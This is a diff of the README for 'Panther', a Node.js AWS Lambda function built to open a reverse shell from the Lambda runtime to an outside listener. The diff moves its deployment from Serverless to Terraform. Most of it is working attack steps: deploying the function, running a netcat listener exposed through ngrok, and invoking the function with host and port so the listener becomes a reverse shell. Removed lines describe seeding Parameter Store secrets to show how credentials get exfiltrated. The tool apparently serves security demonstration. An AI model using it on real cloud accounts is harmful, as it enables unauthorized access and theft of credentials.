@@ -5,57 +5,34 @@ Panther is a Node.js function that can be deployed to the AWS to establish a TCP
 ## Installing Prerequisites
 
 * [AWS Command Line Interface](https://aws.amazon.com/cli/)
-* [Node.js v14.15.4 / NPM](https://nodejs.org/en/download/)
+* [Node.js v16 / NPM](https://nodejs.org/en/download/)
+* [Terraform](https://learn.hashicorp.com/terraform/getting-started/install.html)
 
-## Deploying The Function and Resources
+## Deploying The Function
 
 ```bash
-cd /PATH/TO/panther
-aws configure
-npm install
-
-# AWS profile to use
-export AWS_PROFILE=default
-
-# Optional: Run the Lambda in a VPC.
-export IN_VPC=true
-
-# Optional: Create protected S3 bucket that the Lambda execution role has access to.
-export WITH_BUCKET=true
-export BUCKET_SUFFIX=$(uuidgen | cut -b 25-36 | awk '{print tolower($0)}') # Save this value for future sessions.
-
-npx serverless deploy
+# AWS profile to use for the deployment
+export TF_VAR_profile=default
+export TF_VAR_unique_identifier=$(uuidgen | cut -b 25-36 | awk '{print tolower($0)}') 
+cd ./panther/src/terraform
+terraform init
+terraform apply --auto-approve
 ```
 
-Record the API key provided in the output:
+## Function Testing
+
+Retrieve the Function URL and API Key via the CLI.
 
 ```bash
-Serverless: Stack update finished...
-Service Information
-service: panther
-stage: dev
-region: us-east-1
-stack: panther-dev
-resources: 14
-api keys:
-  panther: YOUR_API_KEY
+export PANTHER_FUNCTION_URL=$(terraform output --json | jq -r '.panther_function_url.value')
+export PANTHER_API_KEY=$(terraform output -json | jq -r '.panther_function_api_key.value')
+curl -H "X-API-Key: $PANTHER_API_KEY" $PANTHER_FUNCTION_URL
 ```
 
-In addition to deploying the function, if `WITH_BUCKET=true` and `BUCKET_SUFFIX` is set, this will create a private S3 Bucket with an image. The Lambda role will have unnecessary permissions to access these resources as well as to an AWS Parameter Store path to demonstrate the damage that can be done by exfiltrating credentials from the runtime environment.
+The result should show an error message indicating required C2 parameters are missing:
 
-To store a secret in the aforementioned Parameter Store path, run the following:
-
-```bash
-aws ssm put-parameter --name /panther/database/user --value "panther_user" --type SecureString
-aws ssm put-parameter --name /panther/database/password --value "RG9ncyBhcmUgb3VyIGxpbmsgdG8gcGFyYWRpc2UuIFRoZXkgZG9uJ3Qga25vdyBldmlsIG9yIGplYWxvdXN5IG9yIGRpc2NvbnRlbnQu" --type SecureString
-```
-
-## Testing in AWS
-
-If you have [Netcat](http://netcat.sourceforge.net/) and [ngrok](https://ngrok.com/) installed, you can use this script:
-
-```bash
-script/panther --url-id YOUR_API_GATEWAY_ID --api-key YOUR_API_KEY
+```json
+{"message":"Must provide the host and port for the target TCP server as query parameters."}
 ```
 
 See [here](../script/USAGE.md) for more details on how to use this script.
@@ -66,57 +43,27 @@ Alternatively, you can do this manually by setting up a Netcat listener like so:
 nc -l 4444
 ```
 
-To make your listener accessible from the public internet, consider using a service like [ngrok](https://ngrok.com/):
+Then, to make your listener accessible from the public internet, consider using a service like ngrok:
 
 ```bash
 ngrok tcp 4444
 ```
 
-Invoke your function, supplying your connection details and API key:
+Finally, invoke your function, supplying your connection details and API key:
 
 ```bash
-curl "https://YOUR_API_GATEWAY_ID.execute-api.$AWS_REGION.amazonaws.com/dev/api/Panther?host=YOUR_PUBLICLY_ACCESSIBLE_HOST&port=YOUR_PORT_NUMBER" -H 'X-API-Key: YOUR_API_KEY'
+curl -H "X-API-Key: $PANTHER_API_KEY" $PANTHER_FUNCTION_URL
+?host=NGROK_PORT_IP&port=NGROK_PORT_NUMBER"
 ```
 
-Your listener will now act as a reverse shell for the duration of the function invocation. You can adjust the function timeout in the serverless.yml file, though it cannot be extended past 30 seconds as it is attached to an API Gateway.
+Your listener will now act as a reverse shell for the duration of the function invocation.
 
 ## Teardown
 
 ```bash
-npx serverless remove
-```
-
-## Running Locally
-
-```bash
-npm start
-```
-
-## Testing Locally
-
-```bash
-curl 'http://localhost:3000/api/Panther?host=YOUR_ACCESSIBLE_HOST&port=YOUR_PORT_NUMBER' -H 'x-api-key: offlineKey'
-```
-
-## Linting
-
-```bash
-npm run lint
+terraform destroy
 ```
 
 ## Learning More
 
-Read [documentation](docs) on what you can accomplish once you connect to the runtime via Panther.
-
-## Serverless AWS NodeJS Template
-
-Creating the original function template using the serverless framework.
-
-```bash
-cd src
-serverless create --template aws-nodejs --path panther
-```
-
-## Exploring Serverless
-
-Refer to [Serverless Docs](https://serverless.com/framework/docs/providers/aws/) for more information.
+Read [documentation](./docs/NOTES.md) on what you can accomplish once you connect to the runtime via Panther.
